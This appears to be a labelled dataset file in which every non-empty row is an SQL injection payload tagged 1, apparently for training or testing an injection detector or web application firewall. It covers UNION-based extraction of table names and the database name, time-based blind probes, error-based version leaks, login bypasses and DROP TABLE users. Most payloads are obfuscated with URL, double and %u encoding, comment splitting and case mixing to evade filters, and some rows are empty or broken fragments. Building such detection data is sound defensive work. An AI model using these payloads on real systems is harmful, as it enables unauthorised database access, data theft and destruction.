"1%29%2%30UNION%%320S%45LECT%%32%30%31%2Cdatabase%28%29%2C3----wxhlwml31bcn", 1
"'AND1<=1/*%0d%0a*/----k0mm07u021u50e", 1
";seLeCt/*%0d%0a*/Pg_sLeEp(5);----7PAnIn", 1
"%u0027%u0020u%6eion%u0020SeLect%20%31,2,3--", 1
"%3B%2520DRO%2550%20tABLE%20uSer%2573%3B%20--", 1
"1%u0027%u0020%U0020%U0020%U0020%U0020%U0020%u0020%U0020%U0020%U0020Or%u0020%u0020%u0020%U0020%U0020%U0020%U0020%U0020%U0020%U0020iF(suBStRING(DATABasE(),%U0020%u0020%U0020%U0020%U0020%u0020%u0020%u0020%u0020%U00201,%u0020%u0020%u0020%U0020%U0020%U0020%u0020%U0020%U0020%U00201)%20=%20%U0027A%U0027,%u0020%u0020%u0020%u0020%u0020%U0020%U0020%u0020%u0020%u0020SleEP(5),%U0020%U0020%U0020%u0020%U0020%U0020%U0020%u0020%u0020%u00200)%u0020%u0020%U0020%u0020%U0020%U0020%U0020%u0020%u0020%U0020--", 1
"1%u0027%u0020%u0020%u0020%u0020%u0020%u0020OR%u0020%u0020%u0020%u0020%u0020%u0020ascii(substring(database(),%u0020%u0020%u0020%u0020%u0020%u00201,%u0020%u0020%u0020%u0020%u0020%u00201))%u0020%u0020%u0020%u0020%u0020%u0020%3E%u0020%u0020%u0020%u0020%u0020%u0020100%u0020%u0020%u0020%u0020%u0020%u0020--", 1
"admi%6e%27/**/%4fR/**/%271%27%3D%271", 1
"%3B%20DROP%20TABLE%20users%3B%20--%23nvb8d4bzatb83", 1
"'/**/OR%201	=%091%20--%20--81a4vl", 1
"1' AND substring(database(), 1, 1) = 's'  /*!*/AND 1=1--", 1
"1' %55nIoN SElE%43T tAbLE%5fNAme, null, nUlL %46ROm INfOR%6DatIo%6E_sC%68ema.TaBLeS %2d-", 1
"' or 1=1  AND 'a'='a'--", 1
"%u0027%u0020A/*!*/ND%u00201=convert(int,@@version)--", 1
"' || 1=1 -- #Ws4SEthLBfu", 1
"%27%20||%20(1%3D1)1%3D1%20--%20", 1
"1%27%20Or%20if(%73uBStR%49n%47(datAbaSE(),%201,%201)%%33D%27A%27,%2%30slEep(5)%2c%20%30)%20--", 1
"1'/**/XOR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**//**/OR/**/(1)--", 1
"%u0027%u0020&&%u0020(1=1)extractvalue(1,concat(0x5c,version()))--", 1
"1 && (1=1)1=1#gpjyzblq48xocd", 1
";%20DROP%20TABLE%20users;%20%20#%20more_noise--", 1
"'%20OR/*!12345*/'1'='%31", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  -- random_noise----25iqa2", 1
"' && (1=1)EXtRactvalue(1,conCaT(0x5c,VeRSIoN()))--", 1
"test%27 %4f%52 '1'='1' --", 1
"'/**/OR/**/EXISTS(SELECT/**/1/**/FROM/**/users)----4tb5rf2qa4g2f0h", 1
"'/*!*/AND e%78tractvalue(1,concat(0x%35c,ve%72si%6fn%28)))----tpl1qa0wfcj", 1
"%27%20UNION%20SELECT%201%2C2%2C3%20--%20random_noise--", 1
"1)UNION%0aSELECT%0a1,database(),3--", 1
"", 1
"%u0027%u0020AND%u00201%09>=%091%u0020--%u0020", 1
"'UN/*!*/ION/%2a%0d%0a*/SEL%45C%54%0a1,2,3--%0%61", 1
"' uNiON SElEcT nuLl, nULl, nuLL --", 1
"1/*!*/XOR 1IN (1)1--pfbhnji4o6c", 1
"admin'%09%09%09O/**/R%09%09%09'1'	=%09'1--cnhllm3h8r", 1
"1%2527%2520OR%2520ascii%28substring%28database%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520--%23npczqxhvphoc5z", 1
"'AND%0aextractvalue(1,concat(0x5c,version()))--", 1
"%u0027/*!12345*/OR%u00201	=  1%u0020--%u0020#958w5g", 1
"%27%20UNION%20SELECT%20%31,2%2c%33--", 1
"; sELecT Pg_SLEeP(5); --", 1
";DRO%50%0d%0aTAB%4cEusers;", 1
"-%2d", 1
"1' %55NI%4fN SE%4cECT table_name, null%2c null FROM information%5fschema.%74a%62l%65s  /*!*/AND 1=1--", 1
"test%27%20OR%20%271%27%3D%27%31%27%20%20/*!*/%41ND%201%3D1--%20", 1
"'/**/%26&/%2a*/extractvalue%281,concat%280x%35c,version()))-%2d", 1
"admin'OR%0a'1'='1/*%0a*/ XOR 'a'='a'", 1
"'/**/UNION SELECT 1,2,3 -- random_noise--", 1
"'/*!12345*/&& (1>=1)ExTRActVaLue(1,cOnCat(0x5c,vERSiOn()))--", 1
";%20SELEC%54%u0020pg_%73leep(5);%u0020--", 1
"admIN%U0027/*!*/OR%u0020%U00271%u0027=%U00271--vzivcVP164i39", 1
"1%27%20XOR%20substring(database(),%201,%201)%20%3D%20%27s%27%20----6bhtcj", 1
"1%u0027/**/OR/**/IF(substring(database(),/**/1,/**/1)=%u0027a%u0027,/**/SLEEP(5),/**/0)/**/--", 1
"%3B%20DroP%20tABlE%20uSers%3B%20--", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020----rorrooeflykd", 1
"1/**/aND 1=1#9p09qy7d", 1
"'%20%20UNION%20%20SELECT%20%201,2,3----qaed562360w", 1
"'			UNION			SELECT			1,2,3--", 1
"'		||		EXISTS(SELECT		1		FROM		users)--", 1
"1%20AND%201%3D1#606q3hp", 1
"1' or iF(sUbStriNg(DAtABasE(), 1, 1)='A', SLEEp(5), 0) --", 1
"' aNd%201=%31 -- #iLl162OuQ%624h", 1
"'/**/OR/**/'1'='1--dmlyb9y", 1
"1%27%2520%2520%2520%2520%2520OR%2520%2520%2520%2520%2520IF%28substring%28database%28%29%2C%2520%2520%2520%2520%25201%2C%2520%2520%2520%2520%25201%29%20%3C%3D%20%20%27a%27%2C%2520%2520%2520%2520%2520SLEEP%285%29%2C%2520%2520%2520%2520%25200%29%2520%2520%2520%2520%2520--", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%20--%20random_noise--", 1
"%27%20ANd%20exTRACTvALUe(1,CONcAT(0X5c,veRsIoN()))--", 1
"WAITFOR%u0020DELAY%u0020%u00270:0:5%u0027%u0020--%u0020random_noise--#n9563mouwmyq1", 1
"1' XOR AScii(SUBSTrING(DatABAsE(), 1, 1)) > 100  ANd 'A'='A'--", 1
"'  OR  '1' = '1", 1
"1%27/**/AND/**/substring(database(),/**/1,/**/1)/**/%3D/**/%27s%27/**/%20OR%20(1)--", 1
"TEST%u0027/**/Or/**/%u00271%u0027=%u00271%u0027/**/--/**/", 1
"%27%20AND%201%3Dconvert(int,@@version)%20OR%20(1)--", 1
"%3b%20dROp%20T%41bLE%20US%65Rs%3B%2%30--", 1
"1%27%20AND%20substring(database(),%201,%201)%20LIKE%20%27s%27%20----pumw26wsedju3", 1
"1'uNIONsELecTTablE_NAMe,/*%0a*/Null,NUllFrOminfORMaTIOn_SChEMa.TaBLEs----mt5l03gcqbrd5zj", 1
"1'	Or	AScII(SUBStrINg(DaTABAse(),	1,	1))	>	100		OR	'b'%20=	'b'--", 1
"%u0027%U0020anD%U0020EXTraCtVaLUE(1,CONCAT(0X5C,veRsioN()))%20Or%20%27b%27%3D%27B%27--", 1
"' OR EXISTS(SELECT 1 FROM users) OR 'b'='b'----1xfvlue", 1
"1) UNION SELECT 1,database(),3--#bv2hoz", 1
"1))%20UNION%20SELECT%201,database(),3 # more_noise--", 1
"TesT' OR '1'='1' %2f%2a", 1
"'/**/UNion/**/seLecT/**/1,2,3--", 1
"1 AND 1=1#kbowasp0c", 1
";/**/drOP/**/tABlE/**/USErS;/**/ OR 'b'='b'--#2N4lu7NSROV", 1
"' || (1=1)1=1 -- #zg3opvtl0747u33", 1
"1)	UNION	SELECT	1,database(),3--", 1
"test' OR %271'='1' %2f*#%6eltrn3nd%626p0zyt", 1
"%27%20Or%20eXIsts(sELECt%201%20from%20USErS)--", 1
"1%u0027%u0020AND%u0020SUbString(dATAbAse(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
"1%27%20OR%20IF(substring(database(),%201,%201)%3D%27a%27,%20SLEEP(5),%200)%20 OR (1)--", 1
"1'/**/OR/*%2a/ascii(su%62string%28databa%73e(),/**/1%2c/**/1))/**/>%2f**%2f100/**//**/#/**/m%6fre_noise-%2d", 1
"'AND/*%0a*/1=1--/*%0d%0a*//*%0a*/", 1
"%u0027%09%09%09%09%09Or%09%09%09%09%09eXIstS(sELeCt%09%09%09%09%091%09%09%09%09%09FroM%09%09%09%09%09uSers)--", 1
"1%u0027%u0020OR%u0020ascii(substring(database(),%u00201,%u00201))%u0020%3E%u0020100%u0020%20AND%20%27a%27%3C%3D%27a%27--", 1
"1%2527%2520or%2520aSciI%28SUbstRIng%28databaSe%28%29%2C%25201%2C%25201%29%29%2520%253E%2520100%2520--", 1
"'%20%20%20%20%20AND%20%20%20%20%20extractvalue(1,concat(0x5c,version()))--", 1
";%u0020drOp%u0020tAble%u0020uSErS;%u0020--", 1
"'/*!%2a/OR     EXI%53TS(SELECT   %20 1  %20  FROM %20   users)-%2d", 1
"' UNION SELECT 1,2,3 -- random_noise--#505r3ziclocse9t", 1
"%u0027%u0020OR%u00201=1%u0020--%u0020#n8ze12gtif4", 1
"'UNIONSELECT1,2,3/*!*//*!*/AND 1=1--/*%0d%0a*/", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%u0020OR%u0020(1)--", 1
"1%27%20%58OR%20substring(da%74abas%65(),%201,%201)%20%3D%20%27s%27%20%20/*!*/AN%44%201%3D1-%2d", 1
"'/*!12345*/&& 1=1 --", 1
"'/*!12345*/%4fR '1%27<=%271", 1
"1'/*!*/OR        aSCIi(SUbStRinG(daTAbasE(),        1,        1))        >        100        --", 1
"%31' UNIO%4e SEL%45CT table_name, null, n%75ll FR%4fM information_sche%6da.tab%6ces %2d-", 1
"1%25u0%253027%2509%2509%2509AN%2544%2509%2509%25%25309substring%28da%2574abase%2528%2529%2C%2509%2509%25091%2C%250%2539%250%2539%250%25391%29%2509%2509%25%25309%25%25320%3D%25u0020%25u0020%2509%2509%2509%25u0027s%25u0027%2509%2509%2509--", 1
"1%27%7C%7C%2F%2A%250a%2A%2FIF%28substriNg%28DAtABASE%28%29%2C1%2C1%29%3D%27a%27%2CSleeP%285%29%2C0%29--", 1
"1%2F%2A%2A%2FAN%2544%201%3D1%20%252d-%20rando%256d_noise", 1
"WAITFO/*!*/RDELAY", 1
"'0:0:5'--#e4e0fonxi4wop1", 1
"1)UNIONSELECT%0d%0a1,database(),3--/*%0a*/", 1
"1%29/**/UN%49ON/**/SELECT%201,database(),%33--", 1
"'AND1=convert(int,@@version) || (1=1)(1)--", 1
"#c63kyjquzzb", 1
"1%27%2509%2509%2509OR%250%2539%2509%2509I%2546%2528substring%28database%28%29%2C%2509%2509%25091%2C%2509%250%2539%25091%2529%2520%3D%2509%27a%27%2C%2509%25%25309%2509%2553LEEP%28%2535%2529%2C%2509%2509%25090%29%2509%2509%2509--", 1
"1'/**/xOr aScii(suBString(dAtABaSE(), 1, 1)) > 100  -- random_noise--", 1
"%27%20Xor%201%3D1%20--%20", 1
"%27%20O/**/R%20ExiStS(sElECt%201%20FRoM%20uSERs)--", 1
"te%73t' OR '1'%3d'1%27 --", 1
"%u0027%09%09%09OR%09%09%091%20=%091%09%09%09--%09%09%09--16bp77pj2auus", 1
";DROP/*%0d%0a*/TABLE/*%0a*/users;--", 1
"%27And%0a1>=c%6fN%76%65Rt(iNT,@@vERsioN)--", 1
"", 1
"1%20AND%201LIKE1 OR 'b'='b'", 1
"%27%20AND%201%3Dconvert%28int%2C%40%40version%29----bsia9depmxrnmr", 1
"1))/*!*/UNIONSELECT/*%0a*/1,database(),3--%0a", 1
"'%09AND%091	= convert(int,@@version)--", 1
"1'%09%09%09OR%09%09%09IF(substring(database(),%09%09%091,%09%09%091)	=	'a',%09%09%09SLEEP(5),%09%09%090)%09%09%09--", 1
"WAITFOR DELAY '0:0:5'----loq5m", 1
"%27%20aND%201%3D1%20--%20", 1
"1/*!*/anD %31=1", 1
"1%2527%2F%2A%2A%2FAND%2F%2A%2A%2Fsubstr%2569ng%28da%2574ab%2561se%2528%29%2C%2F%252a%2A%2F1%2C%2F%2A%2A%2F1%29%252f%2A%2A%2F%3D%2F%2A%2A%2F%27s%27%2F%2A%2A%2F--", 1
"%27/**/UNION/**/SELECT/**/1,2,3--", 1
"waiTF%4fR%20DeLAY%20%270%3%410%3%415%27--#ypniae", 1
"1'%20%20%20XoR%20%20%20aScii(sUBstrinG(dATaBaSE(),%20%20%201,%20%20%201))%20%20%20>%20%20%20100%20%20%20--", 1
"1'%09%09%09%09%09OR%09%09%09%09%09ascii(substring(database(),%09%09%09%09%091,%09%09%09%09%091))%09%09%09%09%09>%09%09%09%09%09100%09%09%09%09%09----1dnot", 1
"1%27/**/A/**/ND/**/substring(database(),/**/1,/**/1)/**/%3D/**/%27s%27/**/--", 1
"1%%327%20OR%20IF(substring(dat%61%62ase(),%201%2c%201)%3D%2%37a%27,%%320SLEEP(5),%200)%20%2d-#xg58t985", 1
"1'%2f**/U%4e/**/ION/%2a*/SELECT%2f%2a*/table_name,/**/nul%6c,/**%2fnull/**/FROM/**/in%66o%72ma%74ion_schema.tables/**/-%2d", 1
"%27%20OR%20E%58ISTS%28SELE%43T%%3201%20FROM%20use%72s%29%2d-", 1
"'AND", 1
"extra%63t%76alue(1,concat%280x5c,ve%72sion()))--%23x%61reu5natfkr%30xp", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#3xre9y7d", 1
";/*!12345*/SELECT%u0020pg_sleep(5);%u0020--", 1
"tEsT%27%20OR%20%271%27%3D%271%27%20--%20", 1
"1))UNION%0d%0aSELECT/*%0d%0a*/1,database(),3--", 1
"", 1
"1%27%2509%2509OR%2509%2509IF%28substring%28database%28%29%2C%2509%25091%2C%2509%25091%29%20%3D%20%27a%27%2C%2509%2509SLEEP%285%29%2C%2509%25090%29%2509%2509--", 1
"WAITFOR DELAY '0:0:5' /*!*/AND 1=1--", 1
";/*!*/drOPTable/*%0a*/uSers;/*%0d%0a*/%0d%0a--", 1
"1'UNIONSELECTtable_name,null,nullFROM/*%0a*/information_schema.tables--", 1
";/*%2a%2fseLect/**/pG_%73Leep(5);/**/%2d-", 1
"1)/**/UNION/**/SELECT/**/1,database(),3 OR 'b'='b'--", 1
"WAITFO%52/*!*/DELAY/**/'0%3a0%3a5'-%2d", 1
"1'/*!12345*/uNiON sELeCT tABLe_NAme, NUll, nUll FROm iNforMaTiON_SchEMA.TAblEs --", 1
"WAITFO/**/R/**/DELAY/**/'0:0:5'--#ryl7l4xbikjdx", 1
"'OREXISTS(SELECT1FROM/*%0d%0a*/users)--", 1
"1%u002%37%u0020Uni%4fn%u00%320SelEct%u0020t%41B%4ce_NAmE,%u002%30nU%6cL,%u0020nu%6cL%u0020FROm%u0020inf%4fRm%61TioN%5fScHEmA.TAbleS%u0020--", 1
"'OREXISTS(SELECT1FROM%0d%0ausers)--", 1
"WAI%2554FOR%20%2544ELAY%20%27%2530%3A0%3A5%27--", 1
"1' || (1=1)ASciI(sUBStRing(datABASE(), 1, 1)) > 100 --", 1
"%U0027%u0020AnD%U0020EXtRACTVALUe(1,cONcAT(0x5C,vErsIoN()))--", 1
";/**/SELecT/**/pg_SLEeP(5);/**/--", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20 /*!*/AND 1=1----9o2usjc33", 1
"%u0027/*!*/OR%u00201<=1%u0020--%u0020", 1
"%27%20Un/*!*/IOn%20SElECT%20NulL,%20NULL,%20nUll%20--%20", 1
"1)      UNION      SELECT      1,database(),3--", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29----nbetvw2exwk4f", 1
"%27/**/AND/**/extractvalue(1,concat(0x5c,version()))--", 1
"'UNION%0%64%0aSEL%45CT1,2,3/*!12345*/OR (%31)--/*%0d%0a*%2f", 1
"%27AND", 1
"1%3Dconvert(int,@@version)--%0a--uh9ee", 1
"'%20%20&&%20%201	= 1%20%20--%20%20", 1
"1%20And%201%3D1", 1
"1%27OR/*%0a*/IF(substring(database(),/*%0d%0a*/1,1)%3D%27a%27,SLEEP(5),0)--#nvrik/*%0a*/", 1
"ad%6din'O/*!*/R/*%0a*%2f'1'%3d'1", 1
"", 1
"'%20OR%20eXIsTs(sEl/**/Ect%201%20frOm%20Users)----sF8LqZaRCqUXrg", 1
"test'OR/*%0a*/'1'='1'/*%0a*//*", 1
"", 1
"%3B%2520D%2552OP%2520TA%2542LE%2520%2575sers%3B%2520--", 1
"%25u0027%25u0020A/*!12345*/ND%25u00201%3D1%25u0020%25u0020%23%25u0020more_noise--%25u0020", 1
"%27%20AND%201%20%3D%091%20--%20", 1
"' And eXTRActvALuE(1,CoNcAT(0X5C,veRsION())) OR (1)--", 1
"ADmIn' oR '1'='1 # mORE_nOISe", 1
"t%65st'%20%20%20%20OR%20%20%20%20'1'%09LIKE '1'%20%20%20%20%2f*", 1
"%31%09%09%09%09%09AND%09%09%09%09%091 =  1%09%09%09%09%09--%09%09%09%09%09random_noise--v3tvqbfetxdt8", 1
"%27%20%26%26%201%3Dconvert%28int%2C%40%40version%29--", 1
"1%27%20OR%20I%46(substri%6eg(database(),%201,%201%29%3D%27a%27,%20SLE%45P(5%29,%%3200)%2%30%20%2f*!*/AND 1=1--%231qkd86wn", 1
"1)    %75niON    SE%4cecT    1,d%61tABASe()%2c3----d5g5l", 1
"WAITFOR DELAY '0:0:5'--#cshscdu", 1
"1/*!12345*/AND 1=1 OR 'b'='b'--iefmtd", 1
"1/*!12345*/AND%201%3D1", 1
"1%27 OR ascii(%73ubstring(database()%2c %31, 1)) > 100 --%2d%2dh4uqm", 1
"'OREXISTS(SEL/*!12345*/ECT1%0aFROM", 1
"users)--%0d%0a", 1
"test%2527OR%0A%25271%2527%253D%25271%2527%2F%2A%250a%2A%2F--%250a", 1
"%27%20XOR%201%3Dconvert%28int%2C%40%40version%29--", 1
"'OR", 1
"'1'<='1%0d%0a", 1
"' OR '%31'='%31", 1
";/**/DROP/**/TABLE/**/users;/**/--#4lfh1c", 1
"' OR '1'='1--wl7dn", 1
"%27%20%20%20AND%20%20%20extractvalue(1,concat(0x5c,version()))----xy9rynqh0", 1
"%27%2F%2A%2A%2FAND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%23z0dgcb4bboz", 1
"test'/**/OR '1'='1'  OR 'b'='b'-- #k3a6eh", 1
"WAITFO/**/RDELAY'0:0:5'--%0d%0a", 1
";%20SELECT%20p%67%5fsle%65p(5);%20--", 1
"'%20%20%20%20%20OR%20%20%20%20%201/**//**/=%091%20%20%20%20%20--%20%20%20%20%20#afqx45w", 1
"1/*!*/AND/**/1LIKE1", 1
"1))UNIONSELECT", 1
"1,database(),3 -- random_noise----mgy530xvy3zst7j", 1
"test%u0027%u0020Or%u0020%u00271%u0027=%u00271%u0027%u0020%u0020--%u0020RAnDOm_noIsE--%u0020#3BL721", 1
"%u0027%u0020or%u0020%u00271%u0027LIKE%u00271", 1
"1)%20UNION%20SELECT%201,database(),3 /*!*/AND 1=1----bheml6zsdbz9z", 1
"'/%2a!12345%2a/UNION SELEC%54 1,2,%33--%2d-erji2yo", 1
"admin%27%20OR%20%271%27%3D%271 OR 'b'='b'", 1
"1%u0020AND%u00201<=1 OR 'b'='b'", 1
"1 aNd 1=%31%20# mor%65_nOIsE", 1
"%2%37%20AND%201%3D%63onv%65rt%28int%2C%4%30%40versi%6fn%29--", 1
"W%41ITFOR %44ELAY%20'0:0:5'--#yusjj07f6uo", 1
"1'/**/AND/**/su%62string(databa%73e()%2c%201,/**/1)/**/=/**/'s'/**/%2d---0yb5ps0", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020 # more_noise--#5qx40j45c0ndp", 1
"'AND", 1
"1<=1--", 1
"", 1
"' UNION SELE%43%54%20%6eull, null, null  AND 'a'='a'--", 1
"1%27%20A%4e%44%20s%75bstring(database()%2c%201,%%3201)%2%30%3D%20%27s%27%20--", 1
"1 AND 1=1--j7t96edgy0wg6", 1
"%27%20unIOn%20seLeCt%201,2,3--", 1
"%27%2%30OR%2%30%271%27%3D%271", 1
"admin'%09%4f%52%09'1' = %20'1", 1
"1%27%20OR%20iF%28sUbsTRiNg%28dAtaBaSE%28%29%2C%201%2C%201%29LikE%27A%27%2C%20SLEeP%285%29%2C%200%29%20--", 1
"' or exIsTS(seLEct 1 From USERs) OR (1)--#kyvqsr9", 1
"%3b%20dROP%20TaBLe%20usErS%3B%20OR(1)--%0D%0A", 1
"1%27%20OR%20IF(substring(database(),%201,%201)IN%20(1)%27a%27,%20SLEEP(5),%200)%20--", 1
"'/**/O/*!12345*/R/**/'1'IN (1)'1", 1
"1%2F%2A%21%2A%2FaNd%201%3D1%23pwbgz44477ela", 1
"1'OR%0d%0aascii(substring(database(),1,1))>100%0a--", 1
"%27%20OR%2%30%27%31%27%3D%271", 1
"1%27%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2Ftable_name%2C%2F%2A%2A%2Fnull%2C%2F%2A%2A%2Fnull%2F%2A%2A%2FFROM%2F%2A%2A%2Finformation_schema.tables%2F%2A%2A%2F----4k55jf35qsfjkhb", 1
"'				UNION				SELECT				1,2,3/*!*/# more_noise--", 1
"' AND 1=1  /*!*/AND 1=1--", 1
"%27%20aND%201LikE1%20--%20", 1
"'OREXISTS(SEL/*!*/ECT1/*%0a*/FROMusers)----9dn3k", 1
"1%29%29%2F%2A%2A%2FUNION%20SELECT%201%2Cdatabase%28%29%2C3 /*!*/AND 1=1--%236fcn27waf6", 1
"1%U0027%U0020and%u0020SUBsTRiNG(database(),%U00201,%U00201)%u0020=%U0020%u0027s%U0027%u0020--", 1
"'/**/AND/**/1=convert(int,@@version)/**/OR/**/'b'='b'--", 1
"test%u0027%u0020OR%u0020%u00271%u0027%20%3D%20%u00271%u0027%u0020--%u0020", 1
"adMiN%27%20oR%20%271%27%3D%271", 1
"admin'OR%0d%0a'1'='1#s8z3lb%0a", 1
"test%27 OR '1'='1%27 /*", 1
"%27%20&&%201%3Dconvert(int,@@version)--", 1
"1)%20%20%20%20%20UNION%20%20%20%20%20SELECT%20%20%20%20%201,database(),3%20OR%20%27b%27%3D%27b%27--", 1
"1' && (1=1)substring(database(), 1, 1) = 's' --", 1
"%27OR%0A1%2509%3D%25201--%0A%0A", 1
"test%27%20O/*!12345*/R%20%271%27IN%20(1)%271%27%20/*", 1
"test'/**/OR '1'='1' --", 1
"1%27%20anD%20SubsTRing(DATAbAsE(),%201,%201)%20%3D%20%27S%27%20--", 1
"1%2F%2A%2A%2F%26%26%201%3E%3D1", 1
"WAITFOR%09%09%09%09DELAY%09%09%09%09'0:0:5'--", 1
"TEst%u0027%u0020or%u0020%u00271%u0027=%u00271%u0027%u0020%u0020aND%u0020%u0027A%u0027=%u0027a%u0027--%u0020", 1
"ADMIN%27%20oR%20%271%27%3D%271", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29--%2354z284xl4jy", 1
"%27/*!*/%55NI%4fN%20SELECT%201,2,3--", 1
"1' ANd sUBstRINg(dataBasE(), 1, 1) <= 's' --", 1
"%27%20OR%201%3D1%20 # more_noise--%20#g1193cgm2gv", 1
"' AND 1=1%20%2d-", 1
"1%2527%2F%2A%2A%2FOR%2F%2A%2A%2FI%2546%28substring%28da%2574abase%28%29%252c%2F%2A%2A%2F1%2C%2F%2A%2A%2F1%29%3D%27a%27%2C%2520SLEEP%25285%29%2C%2F%2A%2A%2F0%29%2520--%2348cozl", 1
"'/*!12345*/oR ExiSTs(sELECT 1 FROm uSerS)----c5OCqYCVk8315", 1
"; sEleCT PG_sLEep(5); ----9pihx6m", 1
"1 XOR 1<=1", 1
"1%27%20OR%20ascii(substring(%64ataba%73e(%29,%20%31,%%3201))%20%3E%2%30100%20--#qplkw6305%38", 1
"1%u0027%u0020A%4eD%20substr%69ng(da%74abase(),%u00201,%u00201)%20=%u0020%u0027s%u0027%u0020--", 1
"test'     OR     '1'%09=%20'1'     /*--9k1d3gj8", 1
"%27%2f**/U%4eION/**/SELECT%2f*%2a/1,2,3--", 1
"WAITFOR					DELAY					'0:0:5'--#0g1vf6yqxvv5tod", 1
"'%09%09OR%09%091	=	%31%20--%09%09", 1
"%27%20UN/*!12345*/ION%20SELECT%201%2C2%2C3--", 1
"1%20%20%20AND%20%20%201%20=/*!12345*/ 1", 1
"%31%u0027%%750020uNion%u0020sele%43T%%75002%30TABle_nAmE,%u0020%4eUl%6c,%u0020nuLL%u002%30frO%6d%u%30020INFor%6datIOn_sChema.TableS%u0020--", 1
";   SELECT   p%67_slee%70(5)%3b   ----94vjep5vn", 1
"1'  A%4eD  substr%69%6eg(dat%61base(),  1,  1)  >  =%20  's' %20%2d-", 1
"admin%27/**/||/**/%271%27%3D%271%20AND%20%27a%27%3D%27a%27", 1
"1)/*!12345*/UnION/**/SeLecT/**/1,DATABAsE(),3--", 1
"%27UNIONSELECTnull,null,null--%0d%0a", 1
"admin%u0027O/**/R%u00271%u0027=%u00271/*%0a*/", 1
"%u0027%u0020AND%u002%30%31=conve%72t(int,@%40version%29--", 1
";/**/SELECT/**/%70%67_sleep(5);%20 # more_noise--", 1
"1%27UNionseLECttAbLE_nAmE%2cNULL%2C%250ANulLfROMINFOrmaTION_sCHEmA.TABLEs--", 1
"1'&&substring(database(),1,1)%0a='s'/*%0a*/--#tsxyudrlv6w2", 1
"1' UnioN selECT TAbLe_nAMe, NulL, NUll frOM InfoRMAtIoN_scHEMa.tABLeS --", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)='a',/**/SLEEP(5),/**/0)/**/----1d9uqj", 1
"test'%09%09OR%09%09'1'%09=	'1'%09%09%09%09/*!*/AND%09%091%09=	1--%09%09", 1
";drOptAblE%0auserS;--/*%0A*/--ypvai06y0zfh7v", 1
"admin'OR'1'='1--bv7spnd247/*%0d%0a*/", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3%u0020AND%u0020%u0027a%u0027=%u0027a%u0027----6o1lekhhi375n74", 1
"TeSt'Or'1'='1'/*%0D%0a*/--%0D%0a", 1
"'%20anD 1%3dco%4evErt(InT,@@VeRsIon)-%2d OR (1)", 1
"' AND 1=convert(int,@@version) AND 'a'='a'--", 1
"test%27%20||%20(1%3D1)%271%27%3D%271%27%20/*%20OR%20%27b%27%3D%27b%27", 1
"admin%27%20O/*!12345*/R%20%271%27%3D%271", 1
"' AND extract%76alue(1,con%63at(0%785c%2cve%72sion()))----d%74aa%34vf265ydo", 1
";%20DROP%%320TABLE%20%75sers%3b%20--", 1
"%27AND%250aextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--%250a%23jk6w8", 1
"1%u0027%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020UNION%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020SELECT%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020table_name,%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020null,%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020null%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020FROM%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020information_schema.tables%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020--", 1
"' %4fR %31=1 --", 1
"%27 OR EX%49STS(SELECT 1 FR%4fM u%73ers)--", 1
"%25u0027%25u0020OR%25u00201%2520%3D%25091%25u0020--%25u0020", 1
"%31'/**/U%4e%49ON SEL%45CT table_name,%20null, null FROM info%72mati%6fn_schema.tabl%65s  /*!*/AND 1=1--", 1
"1'%41NDsubs%74ring(da%74aba%73%65(),1,1)=%09's'--/*%0a*/#qbvsh00o", 1
"TeSt%27%2F%2A%2A%2FOr%2F%2A%2A%2F%271%27%3D%271%27%2F%2A%2A%2F--%2F%2A%2A%2F", 1
"' UNION SELECT 1,%32,3 /*!*/AND 1=1--%2d-6bll%70r2p76u%79t8", 1
"1))%u0020UNI%4fN%u0020SELECT%u00201,dat%61bas%65(),3-%2d", 1
";/**/droP/**/TabLE/**/users;/**/--", 1
"%27%20UNION%20SELECT%20null,%20null,%20null%20--%20#c5ogr3q8wmm", 1
"test'OR/*%0a*/'1'='1'", 1
"/*/*%0a*/", 1
"%57AITf%6fR  dELay  '0:0%3a5'--", 1
"1%u0027%U0020Or%U0020ASCii(SUbStRing(DaTabase(),%U00201,%U00201))%u0020>%U0020100%U0020--", 1
"1%27%20UN/*!12345*/ION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20--", 1
"1'UNIONSELECTtable_name,null,nullFROMinformation_schema.tables--%0d%0a#na0yargyn1", 1
"%27%20O/*!*/R%20%271%27%3D%271--oxyrwx04", 1
"1' XOR IF(substring(database(), 1, 1)<='a', SLEEP(5), 0) --", 1
"1'ORIF(substring(database(),/*%0a*/1,/*%0a*/1)='a',SLEEP(5),0)--", 1
"", 1
"1))/*!12345*/UNION SELECT 1,database(),3--#hil4b", 1
"1%27%20AND%20substring(database(),%201,%201)%20%3D%20%27s%27%20 # more_noise--", 1
"%3B%2520DROP%2520TABLE%2520users%3B%2520 /*!*/AND 1=1--", 1
"1'     &&     substring(database(),     1,     1)     %09=      's'     --", 1
"1%27%2F%2A%2112345%2A%2FAND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20%20%7C%7C%20%27b%27%3D%27b%27--", 1
